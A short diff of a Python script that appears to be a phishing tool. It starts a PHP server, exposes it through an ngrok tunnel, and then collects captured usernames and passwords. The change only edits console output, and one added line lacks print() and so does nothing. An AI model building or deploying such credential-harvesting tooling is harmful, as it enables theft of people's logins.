@@ -559,8 +559,11 @@ exit();""")
     elif v == "02":
        phpserver()
        global token
+       print (Fore.Blue+" Launching Ngrok")
        link = ngrok.connect(6060,"http",auth_token=token)
-       print(link)
+       banner.banner()
+       (Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+" URL 1 : "+link)
+       
  # Getting User And Password
     def userin():
         global stat_file
